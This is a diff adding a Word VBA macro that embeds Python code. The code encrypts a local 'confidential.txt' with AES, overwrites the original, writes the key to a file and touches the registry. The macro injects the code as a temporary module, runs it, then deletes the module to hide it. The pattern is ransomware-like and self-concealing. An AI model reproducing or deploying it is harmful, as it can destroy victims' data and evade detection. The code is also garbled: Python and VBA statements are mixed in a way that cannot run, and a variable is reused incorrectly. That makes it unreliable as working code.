@@ -1,0 +1,57 @@
+
+Sub RunPythonCode()
+
+' Set up the Python code
+    Dim pythonCode As String
+    pythonCode = "import os" & vbCrLf & _
+
+                 "import winreg" & vbCrLf & _
+                 "from Crypto.Cipher import AES" & vbCrLf & _
+                 "from Crypto.Util.Padding import pad" & vbCrLf & _
+                 "from Crypto.Random import get_random_bytes" & vbCrLf & vbCrLf & _
+                 "def encrypt_with_aes(input_data, key):" & vbCrLf & _
+                 "    cipher = AES.new(key, AES.MODE_ECB)" & vbCrLf & _
+                 "    padded_data = pad(input_data.encode('utf-8'), AES.block_size)" & vbCrLf & _
+                 "    encrypted_data = cipher.encrypt(padded_data)" & vbCrLf & _
+
+                "    return encrypted_data" & vbCrLf & vbCrLf & _
+                 "def write_registry_value(key, subkey, value_name, value):" & vbCrLf & _
+                 "    try:" & vbCrLf & _
+                 "        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:" & vbCrLf & _
+                 "            winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, value)" & vbCrLf & _
+                 "        return True" & vbCrLf & _
+                 "    except FileNotFoundError:" & vbCrLf & _
+                 "        return False" & vbCrLf & vbCrLf & _
+                 "def main():" & vbCrLf & _
+                 "    file_path = 'confidential.txt'" & vbCrLf & _
+                 "    key = winreg.HKEY_CURRENT_USER" & vbCrLf & _
+                 "    subkey = r""Software\secret_key""" & vbCrLf & _
+                 "    value_name = ""secret_key""" & vbCrLf & _
+
+                 "    value = r"""" & vbCrLf & _
+                 "    if os.path.exists(file_path):" & vbCrLf & _
+                 "        with open(file_path, 'r') as file:" & vbCrLf & _
+                 "            content = file.read()" & vbCrLf & vbCrLf & _
+                 "        key = get_random_bytes(16)" & vbCrLf & vbCrLf & _
+                 "        with open ('key.txt', 'w') as file:" & vbCrLf & _
+                 "            file.write(str(key))" & vbCrLf & vbCrLf & _
+                 "        encrypted_content = encrypt_with_aes(content, key)" & vbCrLf & vbCrLf & _
+                 "        with open(file_path, 'wb') as file:" & vbCrLf & _
+                 "            file.write(encrypted_content)" & vbCrLf & vbCrLf & _
+                 "        MsgBox ""File encrypted successfully.""" & vbCrLf & vbCrLf & _
+                 "        write_registry_value(key, subkey, value_name, value)" & vbCrLf & vbCrLf & _
+                 "End Sub"
+
+    ' Create a new Word module
+    Dim newModule As Object
+    Set newModule = ActiveDocument.VBProject.VBComponents.Add(1)
+
+    ' Set the module code to the Python code
+    newModule.CodeModule.AddFromString pythonCode
+
+    ' Run the Python code
+    Application.Run "main"
+
+    ' Remove the added module
+    ActiveDocument.VBProject.VBComponents.Remove newModule
+
